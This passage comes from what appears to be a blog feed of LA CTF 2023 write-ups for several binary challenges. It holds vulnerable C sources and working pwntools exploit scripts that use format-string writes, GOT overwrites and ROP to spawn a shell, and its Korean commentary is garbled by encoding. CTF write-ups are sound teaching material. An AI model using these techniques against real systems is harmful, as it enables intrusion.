class="string">b&#x27;A&#x27;</span> * (<span class="number">64</span> - <span class="built_in">len</span>(payload))</span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">8</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">0x404068</span>)</span><br><span class="line"><span class="comment"># payload += p64(ret)</span></span><br><span class="line">payload += p64(e.plt[<span class="string">&#x27;gets&#x27;</span>])</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">0x404068</span>)</span><br><span class="line"><span class="comment"># payload += p64(ret)</span></span><br><span class="line">payload += p64(e.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?&#x27;</span>, payload)</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lactf&#123;hey_stop_bullying_my_bot_thats_not_nice&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> La </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>La CTF 2023 - rickroll (FSB)</title>
      <link href="/230215-lactf2023-rickroll/"/>
      <url>/230215-lactf2023-rickroll/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1732">https://ctftime.org/event/1732</a></li></ul><blockquote><p>Make your own custom rickroll with my new rickroll program!<br><code>nc lac.tf 31135</code></p></blockquote><ul><li>[90 solves &#x2F; 449 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> main_called = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (main_called) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;nice try&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    main_called = <span class="number">1</span>;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Lyrics: &quot;</span>);</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">256</span>];</span><br><span class="line">    fgets(buf, <span class="number">256</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Never gonna give you up, never gonna let you down\nNever gonna run around and &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Never gonna make you cry, never gonna say goodbye\nNever gonna tell a lie and hurt you\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÏÜåÏä§ÏΩîÎìúÍ∞Ä Í∞ÑÎã®ÌïòÎã§. fsbÍ∞Ä ÌÑ∞ÏßÑÎã§. Îã§Îßå ÏùµÏä§Ìï† Îïå Ï£ºÏùòÌï¥Ïïº Ìï† Ï†êÏùÄ mainÏùÑ Îã§Ïãú Ïã§ÌñâÏãúÌÇ¨ Îïå <code>main_called</code>ÏùÑ Îã§Ïãú 0ÏúºÎ°ú ÏÑ∏ÌåÖÌï¥Ï§òÏïº ÌïúÎã§.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><ol><li><code>main_called</code>ÏùÑ 0ÏúºÎ°ú ÏÑ∏ÌåÖÌïòÍ≥† <code>puts@got</code>Î•º <code>main</code>ÏúºÎ°ú overwrite -&gt; <code>main_called</code>Îßå 0ÏúºÎ°ú ÏÑ∏ÌåÖÌï¥Ï§ÄÎã§Î©¥ Ïù¥Ï†ú Í≥ÑÏÜç mainÏù¥ Î∞òÎ≥µÌï¥ÏÑú Ïã§ÌñâÎê®</li><li>libc leak Î∞è <code>main_called</code>ÏùÑ 0ÏúºÎ°ú ÏÑ∏ÌåÖ </li><li><code>main_called</code>ÏùÑ 0ÏúºÎ°ú ÏÑ∏ÌåÖÌïòÍ≥† <code>printf@got</code>ÏùÑ <code>system</code>Î°ú overwrie </li><li>‚Äò&#x2F;bin&#x2F;sh\x00‚ÄôÏùÑ ÏûÖÎ†•</li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./rickroll&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;lac.tf&#x27;</span>, <span class="number">31135</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./rickroll&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># for i in range(1, 80):</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># offset 6</span></span><br><span class="line">    payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    payload += fmtstr_payload(<span class="number">6</span>, &#123;</span><br><span class="line">        e.sym[<span class="string">&#x27;main_called&#x27;</span>] : p8(<span class="number">0</span>),</span><br><span class="line">        e.got[<span class="string">&#x27;puts&#x27;</span>] : e.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;cs:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">    i = <span class="number">11</span></span><br><span class="line">    info(<span class="built_in">hex</span>(i))</span><br><span class="line">    payload = <span class="string">b&#x27;&#x27;</span> </span><br><span class="line">    payload += <span class="string">b&#x27;%8$hhn__&#x27;</span> <span class="comment"># 6</span></span><br><span class="line">    payload += <span class="string">b&#x27;%11$p&#x27;</span> <span class="comment">#+ i.to_bytes(1, &#x27;big&#x27;) + b&#x27;$p&#x27;    # 7 16</span></span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">16</span>-<span class="built_in">len</span>(payload)) <span class="comment"># padding</span></span><br><span class="line">    payload += p64(e.sym[<span class="string">&#x27;main_called&#x27;</span>])</span><br><span class="line"></span><br><span class="line">    pause()</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;cs:&#x27;</span>, payload)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;0x&#x27;</span>, timeout = <span class="number">0.5</span>)</span><br><span class="line">    libc.address = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x53d9b</span></span><br><span class="line">    info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    payload += fmtstr_payload(<span class="number">6</span>, &#123;</span><br><span class="line">        e.sym[<span class="string">&#x27;main_called&#x27;</span>] : p8(<span class="number">0</span>),</span><br><span class="line">        e.got[<span class="string">&#x27;printf&#x27;</span>] : libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    pause()</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;cs:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;cs:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">    <span class="built_in">print</span>(ex)</span><br><span class="line">    p.close()</span><br><span class="line">    <span class="comment"># p = process(&#x27;./rickroll&#x27;)</span></span><br><span class="line">    p = remote(<span class="string">&#x27;lac.tf&#x27;</span>, <span class="number">31135</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>ÎèÑÏª§ÌååÏùºÏù¥ Ï†úÍ≥µÎêòÏóàÏùåÏóêÎèÑ Î°úÏª¨Í≥º Î¶¨Î™®Ìä∏ ÌôòÍ≤ΩÏùÑ ÎòëÍ∞ôÏù¥ ÎßûÏ∂∞Ï£ºÏßÄ ÏïäÍ≥† Î°úÏª¨ÏóêÏÑú Î®ºÏ†Ä ÏâòÏùÑ ÌöçÎìùÌïòÍ≥† Î¶¨Î™®Ìä∏Î•º Ïã§ÌñâÌñà. ÎãπÏó∞Ìûà Ïã§Ìå®ÌñàÎã§. „Öã Í∑∏ÎûòÏÑú ÎåÄÏ∂© Î∏åÌè¨Î°ú leak Ïò§ÌîÑÏÖã ÎßûÏ∂∞Ï£ºÎ†§Í≥† ÌñàÎäîÎç∞ Ïûò ÏïàÎêòÏñ¥ÏÑú Í∑∏ÎÉ• patchelf Ìï¥Ï§òÏÑú Î¨∏Ï†úÎ•º ÌíÄÏóàÎçò Í∏∞ÏñµÏù¥ ÎÇúÎã§. </p><p>ÎèÑÏª§ÌååÏùºÏù¥ Ï†úÍ≥µÎêòÎ©¥.. ÌôòÍ≤ΩÎ∂ÄÌÑ∞ ÎßûÏ∂∞Ï£ºÎäîÍ≤å Îçú Í∑ÄÏ∞ÆÏùÄ Í≤ÉÏùÑ Íπ®Îã¨ÏïòÎã§.</p><p>Í∑∏Î¶¨Í≥† <code>fmtstr_payload</code>ÏùÄ ÎèôÏãúÏóê Ïó¨Îü¨Í∞ú ÎçÆÏùÑ Ïàò ÏûàÎã§Îäî Ï†êÍ≥º payloadÎ•º Íµ¨ÏÑ±Ìï† Îïå Ï†Ä Ìï®ÏàòÎßå Îã®ÎèÖÏúºÎ°ú Ïç®Ï§òÏïºÌïòÎäî Í≤ÉÏùÑ Íπ®Îã¨ÏïòÎã§.</p><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lactf&#123;printf_gave_me_up_and_let_me_down&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> La </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fsb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>La CTF 2023 - rut-roh-relro (RELRO)</title>
      <link href="/230215-lactf2023-rut-roh-relro/"/>
      <url>/230215-lactf2023-rut-roh-relro/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1732">https://ctftime.org/event/1732</a></li></ul><blockquote><p>My friend keeps writing super insecure C programs but I‚Äôm too lazy to fix his code. I‚Äôm sure it‚Äôll be fine as long as I use enough exploit mitigations, right?<br><code>nc lac.tf 31180</code></p></blockquote><ul><li>[70 solves &#x2F; 462 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>Full Relro!! NX and PIE are enabled.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;What would you like to post?&quot;</span>);</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">512</span>];</span><br><span class="line">    fgets(buf, <span class="number">512</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Here&#x27;s your latest post:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nWhat would you like to post?\n&quot;</span>);</span><br><span class="line">    fgets(buf, <span class="number">512</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nYour free trial has expired. Bye!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>You can find twice fsb.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><ol><li>leak libc, stack, pie &#x2F; <code>ret2main</code> (Overwrite the ret in stack to <code>main</code>)</li><li>Overwrite the ret in stack to <code>system</code> &#x2F; Overwrite the <code>rdi</code> to ‚Äò&#x2F;bin&#x2F;sh\x00‚Äô</li></ol><p>The <code>rdi</code> is in the writeable space. You know the libc address. Got the offset during debugging and overwrite it.</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./rut_roh_relro&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;lac.tf&#x27;</span>, <span class="number">31134</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./rut_roh_relro&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc,stack,pie</span></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%71$p%68$p%63$p&#x27;</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">libc.address = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x23d0a</span></span><br><span class="line">info(<span class="string">&#x27;libc address &#x27;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">info(<span class="string">&#x27;stack &#x27;</span> + <span class="built_in">hex</span>(stack))</span><br><span class="line">ret = stack - <span class="number">0xe8</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">e.address = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x1265</span></span><br><span class="line">info(<span class="string">&#x27;pie address &#x27;</span> + <span class="built_in">hex</span>(e.address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># og = [0xc961a, 0xc961d, 0xc9620]</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += fmtstr_payload(<span class="number">6</span>, &#123;ret : e.symbols[<span class="string">&#x27;main&#x27;</span>]&#125;)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">###### (2) ######</span></span><br><span class="line">ret = stack - <span class="number">0xe0</span></span><br><span class="line">rdi = libc.address + <span class="number">0x1d1990</span></span><br><span class="line">info(<span class="built_in">hex</span>(ret))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += fmtstr_payload(<span class="number">6</span>, &#123;ret : libc.symbols[<span class="string">&#x27;system&#x27;</span>]&#125;)</span><br><span class="line">payload += <span class="string">b&#x27;\x00\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += fmtstr_payload(<span class="number">6</span>, &#123;rdi : <span class="string">b&#x27;/bin/sh\x00&#x27;</span>&#125;)</span><br><span class="line">payload += <span class="string">b&#x27;\x00\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>I want to use the one gadget, but I can‚Äôt. :( I have no choice to do honestly. Run the <code>system(&#39;/bin/sh\x00&#39;)</code> :).</p><p>But Some people use that gadget.. good.</p><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lactf&#123;maybe_ill_add_asan_for_good_measure&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> La </category>
          
      </categories>
      
      
        <tags>
            
            <tag> relro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>La CTF 2023 - gatekeep</title>
      <link href="/230214-lactf2023-gatekeep/"/>
      <url>/230214-lactf2023-gatekeep/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1732">https://ctftime.org/event/1732</a></li></ul><p>pwnable Î¨∏Ï†úÎèÑ ÎßéÍ≥† ÎÑàÎ¨¥ Ïû¨Î∞åÎäî Ïî®ÌÖùÏù¥ÏóàÎã§. ÎÇ¥Í∞Ä Î¥§Îçò Î¨∏Ï†úÎì§ÏóêÎäî ÎèÑÏª§ÌååÏùºÍ≥º ÏÜåÏä§ÏΩîÎìúÎ•º Ï†úÍ≥µÌï¥Ï£ºÏóàÎã§.</p><blockquote><p>If I gaslight you enough, you won‚Äôt be able to get my flag! :)<br><code>nc lac.tf 31121</code></p></blockquote><ul><li>[529 solves &#x2F; 138 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>ÏπúÏ†àÌïòÍ≤å</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_flag</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> flag[<span class="number">256</span>];</span><br><span class="line"></span><br><span class="line">    FILE* flagfile = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (flagfile == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Cannot read flag.txt.&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        fgets(flag, <span class="number">256</span>, flagfile);</span><br><span class="line">        flag[<span class="built_in">strcspn</span>(flag, <span class="string">&quot;\n&quot;</span>)] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        <span class="built_in">puts</span>(flag);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">check</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> input[<span class="number">15</span>];</span><br><span class="line">    <span class="type">char</span> pass[<span class="number">10</span>];</span><br><span class="line">    <span class="type">int</span> access = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If my password is random, I can gatekeep my flag! :)</span></span><br><span class="line">    <span class="type">int</span> data = open(<span class="string">&quot;/dev/urandom&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (data &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Can&#x27;t access /dev/urandom.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">ssize_t</span> result = read(data, pass, <span class="keyword">sizeof</span> pass);</span><br><span class="line">        <span class="keyword">if</span> (result &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Data not received from /dev/urandom\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    close(data);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Password:\n&quot;</span>);</span><br><span class="line">    gets(input); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strcmp</span>(input, pass)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;I swore that was the right password ...\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        access = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(access) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Guess I couldn&#x27;t gaslight you!\n&quot;</span>);</span><br><span class="line">        print_flag();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;If I gaslight you enough, you won&#x27;t be able to guess my password! :)\n&quot;</span>);</span><br><span class="line">    check();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>gets</code> Ìï®ÏàòÎäî BOFÍ∞Ä ÏùºÏñ¥ÎÇ† Í∞ÄÎä•ÏÑ±Ïù¥ Ï°¥Ïû¨ÌïúÎã§. <code>/dev/urandom</code>ÏóêÏÑú ÏùΩÏñ¥Ïò® Í∞íÏùÄ Í∞íÏùÑ leakÌïòÎäî Í±∞ ÏïÑÎãå Ïù¥ÏÉÅ Ï†ïÌôïÌïú Í∞íÏùÑ Ïïå ÏàòÍ∞Ä ÏóÜÍ∏∞ ÎïåÎ¨∏Ïóê <code>strcmp(input, pass)</code>ÏùÑ Ïö∞ÌöåÌïòÏó¨ <code>access</code>Î•º 1Î°ú ÏÑ∏ÌåÖÌï¥Ï§òÏïºÌïòÎäî Î∞©Î≤ïÏùÑ ÏÉùÍ∞ÅÌï¥Ïïº ÌïúÎã§.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><p><code>a</code>Î•º ÎßéÏù¥ Î≥¥ÎÇ¥Ï£ºÎãà <code>print_flag</code> 